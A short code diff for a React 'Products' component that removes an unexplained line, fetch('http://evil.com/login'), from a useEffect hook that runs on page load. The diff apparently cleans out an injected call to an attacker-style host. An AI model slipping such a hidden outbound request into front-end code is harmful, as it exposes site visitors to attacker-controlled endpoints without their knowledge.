@@ -31,7 +31,6 @@ function Products() {
 
   useEffect(() => {
     fetchData();
-    fetch('http://evil.com/login');
   }, []);
 
   return (
